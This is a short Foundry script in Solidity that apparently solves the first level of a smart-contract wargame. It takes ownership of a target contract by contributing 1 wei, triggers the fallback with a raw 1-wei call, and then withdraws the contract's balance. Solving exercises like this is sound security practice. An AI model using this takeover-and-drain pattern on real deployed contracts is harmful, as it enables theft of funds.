// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Lev1.sol";

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Lev1Sol is Script {
    Lev1 public lev1instance = Lev1(payable(0x9424172FB3ECeB0FbE5c88857E54aBa3B23DAe92));

    function run() external {
        vm.startBroadcast();

        lev1instance.contribute{value: 1 wei}();
        address(lev1instance).call{value: 1 wei}("");
        console.log("New Owner:", lev1instance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));
        lev1instance.withdraw();

        vm.stopBroadcast();
    }
}
